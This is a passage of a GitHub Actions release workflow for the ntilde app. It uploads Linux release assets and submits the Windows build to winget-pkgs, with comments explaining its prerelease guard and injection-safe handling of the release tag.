      # first release on a channel legitimately produces no delta nupkg, so flipping
      # it would break exactly the case it looks like it would protect. The delta
      # assertion lives in publish_linux, where "was a delta expected?" is known from
      # GitHub instead of guessed from a missing file. Same as the win and osx lanes.
      #
      # The same permissiveness is what lets PKGBUILD-/SRCINFO- sit in this one list
      # for both matrix legs: the generate step above is x64-only, so on the arm64
      # leg those two patterns match nothing and are skipped. A second, conditional
      # upload step would publish the same assets twice as often as it needs to.
      - name: Upload Linux release assets and update feed
        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
        with:
          tag_name: ${{ needs.release_metadata.outputs.release_tag }}
          files: |
            artifacts/release/ntilde-${{ matrix.rid }}-${{ needs.release_metadata.outputs.release_tag }}.AppImage
            artifacts/release/ntilde-${{ matrix.rid }}-${{ needs.release_metadata.outputs.release_tag }}.tar.gz
            artifacts/release/*.deb
            artifacts/release/NtildeApp-${{ needs.release_metadata.outputs.release_version }}-${{ matrix.rid }}-full.nupkg
            artifacts/release/NtildeApp-${{ needs.release_metadata.outputs.release_version }}-${{ matrix.rid }}-delta.nupkg
            artifacts/release/releases.${{ matrix.rid }}.json
            artifacts/release/PKGBUILD-${{ needs.release_metadata.outputs.release_tag }}
            artifacts/release/SRCINFO-${{ needs.release_metadata.outputs.release_tag }}

  # Opens a submission PR to microsoft/winget-pkgs for the just-published Windows
  # zip (portable package; see packaging/winget/). Optional and self-skipping:
  # runs only on real tag pushes and only when the WINGET_PAT secret is set.
  #
  # wingetcreate re-downloads the asset, recomputes the SHA256, and updates the
  # latest manifest from winget-pkgs — so it requires benyblack.ntilde to
  # ALREADY exist there. Bootstrap the first version manually (see
  # packaging/winget/README.md); subsequent releases flow through this job.
  submit_winget:
    name: Submit to winget-pkgs
    runs-on: windows-latest
    needs: [release_metadata, publish_aot]
    permissions:
      contents: read
    # Never submit a prerelease to the community repo. Same contains('-') test as the
    # prerelease flag on create_release: winget-pkgs is for stable versions, and a
    # `-beta`/`-test` tag reaching it is a public retraction, not a private mistake. The step
    # body also self-skips when WINGET_PAT is unset (it is unset today), but that is a
    # coincidence of configuration rather than a guard — this is the guard.
    if: github.event_name == 'push' && !contains(needs.release_metadata.outputs.release_tag, '-')
    steps:
      - name: Submit manifest via wingetcreate
        shell: pwsh
        # Same injection class as the steps above, and this one predates the installer work:
        # the tag reaches the script through env rather than being interpolated into it.
        env:
          WINGET_PAT: ${{ secrets.WINGET_PAT }}
          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
        run: |
          if (-not $env:WINGET_PAT) {
            Write-Host "WINGET_PAT not set; skipping winget-pkgs submission."
            exit 0
          }
          $tag = $env:RELEASE_TAG
          $ver = $tag.TrimStart('v')
          $url = "https://github.com/benyblack/ntilde/releases/download/$tag/ntilde-win-x64-$tag.zip"
          Invoke-WebRequest https://aka.ms/wingetcreate/latest -OutFile wingetcreate.exe
          ./wingetcreate.exe update benyblack.ntilde --version $ver --urls "$url" --submit --token $env:WINGET_PAT
